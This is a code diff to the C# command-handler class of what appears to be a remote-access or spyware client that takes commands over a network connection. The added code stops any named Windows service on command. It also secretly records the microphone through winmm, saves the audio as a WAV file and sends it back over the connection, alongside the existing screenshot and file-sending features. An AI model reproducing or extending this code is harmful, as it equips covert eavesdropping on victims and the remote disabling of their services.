@@ -3,12 +3,16 @@
     using System;
     using System.Diagnostics;
     using System.Threading;
-    using System.Text.RegularExpressions;
     using System.IO;
     using System.Linq;
 
+    using System.ServiceProcess;
+    using System.Runtime.InteropServices;
+    using System.Text.RegularExpressions;
+
     using Core.Screenshot;
     using Core.Connection;
+
 
     public class Command
     {
@@ -17,11 +21,14 @@
 
         private const int DIRECTORY_INTERVAL = 5;
         private const int TASKS_INTERVAL = 5;
-        private const int INTERVAL_SEND_FILE = 500;
+        private const int INTERVAL_SEND_FILE = 1000;
 
-        private static string previousDirectory = string.Empty;
+        private string _previousDirectory = string.Empty;
         private string _filePathInternal = string.Empty;
         private long _fileSize = 0;
+
+        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
+        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
 
         public Command(Connection connection)
         {
@@ -70,7 +77,7 @@
                 Thread.Sleep(DIRECTORY_INTERVAL);
             }
 
-            previousDirectory = directoryPattern;
+            _previousDirectory = directoryPattern;
 
             return;
         }
@@ -276,6 +283,56 @@
                     return;
                 }
 
+                if (commandReceived.StartsWith("ser"))
+                {
+                    var serviceName = Regex.Split(commandReceived, "ser")[1];
+
+                    var sc = new ServiceController(serviceName);
+
+                    if (sc != null && sc.CanStop)
+                    {
+                        if ((sc.Status.Equals(ServiceControllerStatus.Stopped)) ||
+                            (sc.Status.Equals(ServiceControllerStatus.StopPending)))
+                        {
+                            return;
+                        }
+
+                        sc.Stop();
+
+                        sc.Refresh();
+                    }
+                }
+
+                // TODO: Make it async
+                if (commandReceived.StartsWith("rec"))
+                {
+                    var seconds = int.Parse(Regex.Split(commandReceived, @"\*")[1]);
+                    var filePathAudio = "testaudio.wav";
+
+                    mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
+                    mciSendString("record recsound", "", 0, 0);
+
+                    Thread.Sleep(seconds);
+
+                    mciSendString(string.Format("save recsound {0}", filePathAudio), "", 0, 0);
+                    mciSendString("close recsound ", "", 0, 0);
+
+                    var information = string.Format("|archivo|{0}|{1}|", new FileInfo(filePathAudio).Length, filePathAudio);
+
+                    using (var file = new StreamReader(filePathAudio))
+                    {
+                        var buffer = file.ReadToEnd();
+
+                        _connection?.SendData(information);
+
+                        Thread.Sleep(INTERVAL_SEND_FILE);
+
+                        _connection?.SendData(buffer);
+                    }
+
+                    return;
+                }
+
                 if (commandReceived.StartsWith("fil"))
                 {
                     ProcessFile(commandReceived);
@@ -284,6 +341,8 @@
                 }
 
                 ProcessFile(commandReceived, true);
+
+                return;
             }
             catch (Exception ex)
             {
